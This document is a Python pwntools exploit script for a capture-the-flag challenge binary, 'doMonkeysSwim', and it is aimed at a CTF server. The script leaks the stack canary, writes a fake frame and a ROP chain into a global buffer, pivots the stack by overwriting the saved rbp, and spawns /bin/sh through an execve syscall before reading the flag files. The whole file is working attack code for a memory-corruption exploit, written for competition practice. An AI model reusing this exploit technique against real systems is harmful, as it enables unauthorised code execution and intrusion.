#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./doMonkeysSwim', checksec=False)
context.log_level = 'info'

HOST = 'dms.ctf.ritsec.club'
PORT = 1400

BED = 0x4cca60
FAKE_RBP = BED + 0x10

POP_RDI = 0x401f43
POP_RSI = 0x401f45
POP_RDX = 0x401f47
POP_RAX = 0x401f49
SYSCALL = 0x42e216  # syscall ; cmp rax,-4096 ; ja ... ; ret


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process('./doMonkeysSwim')


def menu_choice(io, n):
    io.sendlineafter(b'>> ', str(n).encode())


def leak_canary(io):
    menu_choice(io, 3)
    # This prompt is printed without a flush, so don't wait for it on pipes.
    io.sendline(b'3')
    io.recvuntil(b'0x')
    leak = int(io.recvline().strip(), 16)
    canary = leak & 0xffffffffffffffff
    log.success(f'canary = {canary:#x}')
    return canary


def build_bed(canary):
    data = bytearray(b'\x00' * 105)

    # [fake_rbp-0xc] at BED+4 gets overwritten later by menu choice, keep placeholder.
    # [fake_rbp-0x8] canary at BED+8
    data[8:16] = p64(canary)

    # [fake_rbp] (new rbp after leave)
    data[16:24] = p64(BED + 0x50)

    chain = [
        POP_RDI, BED + 0x60,  # "/bin/sh\x00"
        POP_RSI, 0,
        POP_RDX, 0,
        POP_RAX, 59,
        SYSCALL,
    ]

    off = 24
    for q in chain:
        data[off:off + 8] = p64(q)
        off += 8

    data[0x60:0x68] = b'/bin/sh\x00'
    return bytes(data)


def trigger(io, canary):
    # Fill global bed with fake frame + ROP
    menu_choice(io, 5)
    # fgets size is 0x69, so we can control at most 104 bytes (plus terminating NULL).
    io.sendafter(b'Swap this: ', build_bed(canary)[:104] + b'\n')
    io.sendlineafter(b'With this: ', b'A')

    # Overwrite monkey_do saved rbp -> FAKE_RBP, preserving canary.
    menu_choice(io, 4)
    payload = b'A' * 24 + p64(canary) + p64(FAKE_RBP)[:7]
    # Prompt may be buffered remotely, send directly.
    io.send(payload + b'\n')

    # Queue next menu choice immediately; scanf in print_menu will consume it.
    # game stores 6 into [rbp-0xc], then exits through fake frame and returns into chain.
    io.sendline(b'6')


def get_flag(io):
    io.sendline(b'cat flag* /flag* 2>/dev/null')
    data = io.recvrepeat(1.0)
    print(data.decode('latin-1', errors='ignore'))


def main():
    io = start()

    # Sometimes canary bytes may contain newline and break fgets; retry externally if needed.
    canary = leak_canary(io)
    trigger(io, canary)

    if args.INTERACTIVE:
        io.interactive()
    else:
        get_flag(io)
        io.close()


if __name__ == '__main__':
    main()
